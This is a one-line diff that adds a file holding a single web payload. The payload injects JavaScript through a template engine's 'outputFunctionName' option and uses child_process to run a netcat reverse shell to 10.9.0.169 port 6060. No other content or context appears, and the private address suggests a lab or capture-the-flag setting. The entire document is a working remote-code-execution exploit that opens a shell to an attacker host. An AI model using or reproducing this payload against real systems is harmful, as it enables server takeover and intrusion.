@@ -1,0 +1,1 @@
+settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.9.0.169 6060 -e sh');s
